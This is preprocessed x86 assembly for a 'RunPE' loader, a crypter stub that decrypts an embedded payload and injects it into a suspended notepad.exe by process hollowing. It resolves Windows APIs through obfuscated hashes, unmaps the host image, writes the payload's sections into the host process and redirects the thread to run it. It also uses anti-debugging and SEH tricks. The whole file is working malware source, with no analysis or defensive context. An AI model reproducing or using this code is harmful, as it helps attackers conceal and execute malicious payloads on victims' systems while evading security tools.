%line 1+1 runpe.asm
[align 16]

%line 1+1 macro.asm

%line 8+1 macro.asm


%line 24+1 macro.asm


%line 31+1 macro.asm


%line 39+1 macro.asm


%line 42+1 macro.asm


%line 45+1 macro.asm


%line 48+1 macro.asm


%line 51+1 macro.asm


%line 59+1 macro.asm


%line 71+1 macro.asm

%line 81+1 macro.asm

%line 1+1 payload.inc
PELEN dd 0x2DE28
BBLEN db 0xF6
%line 5+1 runpe.asm

[section .data]
OLLY dd 0x278DCA9D
PEBASE dd 0x278DCA9D
PEB dd 0x278DCA9D
CTX dd 0x278DCA9D
PIS dd 0x278DCA9D
SIS dd 0x278DCA9D
vRPEBASE dd 0x278DCA9D
PEENTRY dd 0x278DCA9D
PEIMAGEBASE dd 0x278DCA9D
PIMAGEBASE dd 0x278DCA9D
PESECTION dw 0xED7E
PEZOFIMAGE dd 0x278DCA9D
PEZOFHEADERS dd 0x278DCA9D
PEOPTHEADER dd 0x278DCA9D
PEBASE2 dd 0
SEH dd _main + 0xED7E

FILE db 'C:\WINDOWS\SysWOW64\notepad.exe',0


%line 1+1 hashs.inc
HASH_SFT equ 0xC
HASH_NTDLL.DLL equ 0x886E6810
HASH_KERNEL32.DLL equ 0x3AA51356
HASH_VIRTUALALLOC equ 0x90B3C01
HASH_NTRESUMETHREAD equ 0xD6510A4C
HASH_WRITEPROCESSMEMORY equ 0x166BE81B
HASH_GETTHREADCONTEXT equ 0xBD7D4A72
HASH_SETTHREADCONTEXT equ 0xBD7D4A66
HASH_NTUNMAPVIEWOFSECTION equ 0x1C77E08A
HASH_GETPROCADDRESS equ 0x1517C213
HASH_CREATEPROCESSA equ 0x12204D71
HASH_VIRTUALALLOCEX equ 0x440C8B3C
HASH_READPROCESSMEMORY equ 0x403BE917
HASH_LOADLIBRARY equ 0x3993C990
HASH_RESUMETHREAD equ 0x96514449
%line 28+1 runpe.asm

[section .text]

%line 32+1 runpe.asm

[global _start]


_start:
 push ebp
 mov ebp,edi


%line 42+1 runpe.asm

 cmp eax,0xED7E+1
 jne .end1s
 call PAYLOAD + 0xC8
.end1s
 cmp eax,0x278DCA9D+1
 jne .ends
 call PAYLOAD + 0xC8 +(0x2DE28 / 2)
%line 51+1 runpe.asm


.ends
 xor eax,eax

 not eax
 sub dword [SEH],0xED7E

 mov edi,esp
 mov ecx,eax
 repne scasd

 mov eax,[SEH]
.gocrash
 stosd
 mov esi,edi
 mov edi,ecx
 loop .gocrash
 ret

PAYLOAD incbin "payload.bin"

_end:
[extern _ExitProcess@4]
%line 74+0 runpe.asm
 push 0
 call _ExitProcess@4
%line 75+1 runpe.asm

 db 0xa0

_main:
 mov ebp,[esp+0xc]
 mov esi,ebp
 mov ecx,4*4
 add ebp,0x6
.crcdr:
 lodsb

 loop .crcdr
 mov ebx,[ebp+eax+0xA4-0x6]
 mov [PEB],ebx
 mov esp,[ebp+eax+0xC4-0x6]

 mov ebx,[ebp+eax+0xB4-0x6]
 or ebx,1
 mov [OLLY],ebx

 mov ebx,[ebp+eax+0xA0-0x6]
 sub ebx,4
 mov [SEH],ebx

 mov ebp,esp


 push HASH_KERNEL32.DLL
%line 102+0 runpe.asm
 call _getdll
%line 103+1 runpe.asm
 push HASH_VIRTUALALLOC
%line 103+0 runpe.asm
 push eax
 call _getfunction
%line 104+1 runpe.asm
 mov ebx, dword[PELEN]
 add ebx, 1024 + 0x54 + 0x10
 push 0x04
%line 106+0 runpe.asm
 push 0x00001000
 push ebx
 push 0
 call eax
%line 107+1 runpe.asm
 mov [PEBASE], eax


 call _bbdecypher
 call _peexec
 jmp _end


%line 1+1 bbcypher.asm

%line 6+1 bbcypher.asm

_bbdecypher:
 push ebp
 mov ebp,esp

 std


%line 15+1 bbcypher.asm
 push _dorowbbox + 0xED7E
%line 17+1 bbcypher.asm

 mov eax,[PELEN]

 xor ecx,ecx
 add cl,[BBLEN]

 pop dword [EBP-((0x04*5)+0x6)]
 mov [EBP-((0x04*3)+0x6)],ecx

 xor edx,edx
 idiv ecx
 dec eax

 mov dword [EBP-((0x04*4)+0x6)],eax



.doallrowbbox:
 mov ecx,[EBP-((0x04*3)+0x6)]

 mov esi,PAYLOAD
 add esi,ecx
 dec esi

 mov eax,[EBP-((0x04*4)+0x6)]
 mov edx,0
 mul ecx

 mov edx,[EBP-((0x04*5)+0x6)]
 mov ebx,PAYLOAD
 add ebx,ecx
 add ebx,eax

%line 51+1 bbcypher.asm
 sub edx,0xED7E
%line 53+1 bbcypher.asm

 mov edi,[PEBASE]
 add edi,eax

 mov eax,0


%line 61+1 bbcypher.asm
 call edx
%line 66+1 bbcypher.asm

 dec dword [EBP-((0x04*4)+0x6)]
 jns .doallrowbbox

 cld

 mov esp,ebp
 pop ebp

 ret


_dorowbbox:
 mov al,cl
 dec al
 xlatb
 mov dl,al
 lodsb
 mov byte [edi+eax],dl
 loop _dorowbbox
 ret

%line 1+1 dllmgt.asm
.code









_getdll:





 push ebp
 mov ebp,esp

 mov ebx, [PEB]
 mov ebx, [ebx+0x0C]
 mov ebx, [ebx+0x14]
 mov edx, [ebx+4]
 xor ecx,ecx
 xor eax,eax
 jmp .startlist

.nextmod:
 cmp ebx,edx
 je .tfini

.startlist:
 mov esi, [ebx+0x28]

.readchar:
 lodsw
 test al,al
 jz .stopreadchar

 cmp al,0x60
 jbe .stoschar
 sub al,0x20
.stoschar
 xor cl,al
 rol ecx,HASH_SFT
 jmp .readchar

.stopreadchar:
 cmp ecx,[ebp+0x8]
 je .tfinifound

 mov ecx,0
 mov ebx, [ebx]
 mov esi, [ebx+0x4]

 jmp .nextmod

.tfinifound
 mov eax, [ebx+0x10]
 jmp .tgohome

.tfini:
 mov eax,0

.tgohome:

mov esp,ebp
 pop ebp
 retn 4











_getfunction:

 push ebp
 mov ebp,esp
 sub eax,eax

 mov eax,[ebp+0x8]
 mov ebx, eax
 mov edx,[eax+60]
 add eax, edx
 mov edx,[eax]
 add eax, 0x78
 mov edx,[eax]
 add ebx,edx

 mov [ExpTable],ebx

 mov edx,[ebp+0xC]

 ExpTable equ ebp-0x8

 mov esi, [ExpTable]

 mov esi, [esi+0x20]
 add esi, [ebp+0x8]
 xor ebx,ebx
 cld

 myloop:
 inc ebx
 lodsd
 add eax , [ebp+0x8]
 push esi
 mov esi,eax
 mov edi,edx
 cld

 xor ecx,ecx

.readcharf:
 lodsb
 test al,al
 jz .stopreadcharf

 cmp al,0x60
 jbe .stoscharf
 sub al,0x20
.stoscharf
 xor cl,al
 rol ecx,HASH_SFT
 jmp .readcharf

.stopreadcharf

 pop esi

 cmp ecx,[ebp+0xc]

 jne myloop

 dec ebx
 mov eax,[ExpTable]
 mov eax,[eax+0x24]
 add eax,[ebp+0x8]
 movzx eax , word [ebx*2+eax]
 mov ebx,[ExpTable]
 mov ebx,[ebx+0x1C]
 add ebx,[ebp+0x8]
 mov ebx,[eax*4+ebx]
 add ebx,[ebp+0x8]
 mov eax,ebx

 mov esp,ebp
 pop ebp
 retn 8

_K32func:
 push HASH_KERNEL32.DLL
%line 158+0 dllmgt.asm
 call _getdll
%line 159+1 dllmgt.asm
 push HASH_READPROCESSMEMORY
%line 159+0 dllmgt.asm
 push eax
 call _getfunction
%line 160+1 dllmgt.asm
 ret

%line 1+1 peexec.asm
[section .text]
%line 3+1 peexec.asm




_peexec:

 mov esi,[PEBASE]
 lodsw
 cmp ax,'MZ' ^ ((0xC8 << 8) + 0xC8)
 jne .end

 add esi,0x3C - 0x2
 lodsd
 mov esi,[PEBASE]
 add esi,eax
 cmp eax,0xFF
 ja .end

 lodsw
 cmp ax,'PE' ^ ((0xC8 << 8) + 0xC8 )
 jne .end
 add esi, 2+2
 lodsw
 mov [PESECTION],ax
 add esi, 3 * 0x4
 lodsw
 add esi,2

 mov [PEOPTHEADER],esi

 mov eax,[esi+0x10]
 mov [PEENTRY],eax

 mov eax,[esi + 0x1C]
 mov [PEIMAGEBASE],eax

 mov eax,[esi+0x38]
 mov [PEZOFIMAGE],eax
 mov eax,[esi+0x3C]
 mov [PEZOFHEADERS],eax


 mov ebx,[PEBASE]
 add ebx,[PELEN]
 PIS_LEN equ 0x54
 SIS_LEN equ 0x10


 push HASH_KERNEL32.DLL
%line 51+0 peexec.asm
 call _getdll
%line 52+1 peexec.asm
 push HASH_VIRTUALALLOC
%line 52+0 peexec.asm
 push eax
 call _getfunction
%line 53+1 peexec.asm
 push 0x04
%line 53+0 peexec.asm
 push 0x00001000
 push 0x10 + 0x44
 push 0
 call eax
%line 54+1 peexec.asm
 cmp eax,0
 je .end

 mov [SIS],eax
 add eax,0x44
 mov [PIS],eax



 push HASH_KERNEL32.DLL
%line 63+0 peexec.asm
 call _getdll
%line 64+1 peexec.asm
 push HASH_CREATEPROCESSA
%line 64+0 peexec.asm
 push eax
 call _getfunction
%line 65+1 peexec.asm
 push dword [PIS]
%line 65+0 peexec.asm
 push dword [SIS]
 push 0
 push 0
 push 0x4
 push 0
 push 0
 push 0
 push 0
 push FILE
 call eax
%line 66+1 peexec.asm
 cmp eax,0
 je .end



 push HASH_KERNEL32.DLL
%line 71+0 peexec.asm
 call _getdll
%line 72+1 peexec.asm
 push HASH_VIRTUALALLOC
%line 72+0 peexec.asm
 push eax
 call _getfunction
%line 73+1 peexec.asm


 push 0x04
%line 75+0 peexec.asm
 push 0x00001000
 push 0x2CF
 push 0
 call eax
%line 76+1 peexec.asm
 cmp eax,0
 je .end
 mov [CTX],eax
 mov dword [eax], 0x10007



 push HASH_KERNEL32.DLL
%line 83+0 peexec.asm
 call _getdll
%line 84+1 peexec.asm
 push HASH_GETTHREADCONTEXT
%line 84+0 peexec.asm
 push eax
 call _getfunction
%line 85+1 peexec.asm
 mov ecx,[PIS]
 mov ecx,[ecx+4]
 mov ebx,[CTX]
 push ebx
%line 88+0 peexec.asm
 push ecx
 call eax
%line 89+1 peexec.asm
 cmp eax,0
 je .end



 push HASH_KERNEL32.DLL
%line 94+0 peexec.asm
 call _getdll
%line 95+1 peexec.asm
 push HASH_READPROCESSMEMORY
%line 95+0 peexec.asm
 push eax
 call _getfunction
%line 96+1 peexec.asm
 mov ecx,[PIS]
 mov ecx,[ecx+0]
 mov ebx,[CTX]
 mov ebx,[ebx+0xA4]
 add ebx,0x8
 push 0
%line 101+0 peexec.asm
 push 4
 push vRPEBASE
 push ebx
 push ecx
 call eax
%line 102+1 peexec.asm
 cmp eax,0
 je .end




 mov eax,[PEIMAGEBASE]
 cmp eax,[vRPEBASE]
 jne .bypassunmap



 push HASH_NTDLL.DLL
%line 114+0 peexec.asm
 call _getdll
%line 115+1 peexec.asm
 push HASH_NTUNMAPVIEWOFSECTION
%line 115+0 peexec.asm
 push eax
 call _getfunction
%line 116+1 peexec.asm
 mov ecx,[PIS]
 mov ecx,[ecx+0]
 push dword [vRPEBASE]
%line 118+0 peexec.asm
 push ecx
 call eax
%line 119+1 peexec.asm


.bypassunmap


 push HASH_KERNEL32.DLL
%line 124+0 peexec.asm
 call _getdll
%line 125+1 peexec.asm
 push HASH_VIRTUALALLOCEX
%line 125+0 peexec.asm
 push eax
 call _getfunction
%line 126+1 peexec.asm
 mov ecx,[PIS]
 mov ecx,[ecx+0]

 mov edx,[PEZOFIMAGE]


 push 0x40
%line 132+0 peexec.asm
 push 0x3000
 push edx
 push dword [PEIMAGEBASE]
 push ecx
 call eax
%line 133+1 peexec.asm


 mov [PIMAGEBASE],eax
 cmp eax,0
 je .end


 mov eax,[PEBASE]
 xor dword [EAX], ((0xC8 << 8) + 0xC8)
 mov eax, [0x3C + EAX ]
 add eax,[PEBASE]
 xor dword [EAX], ((0xC8 << 8) + 0xC8)



 push HASH_KERNEL32.DLL
%line 148+0 peexec.asm
 call _getdll
%line 149+1 peexec.asm
 push HASH_WRITEPROCESSMEMORY
%line 149+0 peexec.asm
 push eax
 call _getfunction
%line 150+1 peexec.asm
 mov ecx,[PIS]
 mov ecx,[ecx+0]
 push 0
%line 152+0 peexec.asm
 push dword [PEZOFHEADERS]
 push dword [PEBASE]
 push dword [PIMAGEBASE]
 push ecx
 call eax
%line 153+1 peexec.asm
 cmp eax,0
 je .end




 push HASH_KERNEL32.DLL
%line 159+0 peexec.asm
 call _getdll
%line 160+1 peexec.asm
 push HASH_WRITEPROCESSMEMORY
%line 160+0 peexec.asm
 push eax
 call _getfunction
%line 161+1 peexec.asm

 mov ebx,[PEOPTHEADER]
 add ebx , 0x10 + 0x60 + 0x70
 dec word [PESECTION]

.recopiesect:

 mov ecx,[ebx + 0xC ]
 add ecx,[PIMAGEBASE]

 mov edx,[ebx + 0x14 ]
 add edx,[PEBASE]

 mov edi,[ebx + 0x10 ]

 mov esi,[PIS]
 mov esi,[esi+0]

 push eax
 push ebx
 push 0
%line 181+0 peexec.asm
 push edi
 push edx
 push ecx
 push esi
 call eax
%line 182+1 peexec.asm
 pop ebx
 pop eax


 add ebx,0x28


 dec word [PESECTION]
 cmp word [PESECTION],0
 jns .recopiesect



 push HASH_KERNEL32.DLL
%line 195+0 peexec.asm
 call _getdll
%line 196+1 peexec.asm
 push HASH_WRITEPROCESSMEMORY
%line 196+0 peexec.asm
 push eax
 call _getfunction
%line 197+1 peexec.asm

 mov esi,[PIS]
 mov esi,[esi+0]

 mov ebx,[CTX]
 mov ebx,[ebx+0xA4]
 add ebx,0x8

 push 0
%line 205+0 peexec.asm
 push 4
 push PIMAGEBASE
 push ebx
 push esi
 call eax
%line 206+1 peexec.asm


 mov ebx,[CTX]
 mov eax,[PEENTRY]
 add eax,[PIMAGEBASE]
 mov [ebx+0xB0],eax


 push HASH_KERNEL32.DLL
%line 214+0 peexec.asm
 call _getdll
%line 215+1 peexec.asm
 push HASH_SETTHREADCONTEXT
%line 215+0 peexec.asm
 push eax
 call _getfunction
%line 216+1 peexec.asm
 mov esi,[PIS]
 mov esi,[esi+4]
 push dword [CTX]
%line 218+0 peexec.asm
 push esi
 call eax
%line 219+1 peexec.asm



 push HASH_KERNEL32.DLL
%line 222+0 peexec.asm
 call _getdll
%line 223+1 peexec.asm
 push HASH_RESUMETHREAD
%line 223+0 peexec.asm
 push eax
 call _getfunction
%line 224+1 peexec.asm
 mov esi,[PIS]
 mov esi,[esi+4 ]

 push esi
%line 227+0 peexec.asm
 call eax
%line 228+1 peexec.asm

.end:

 ret


%line 118+1 runpe.asm

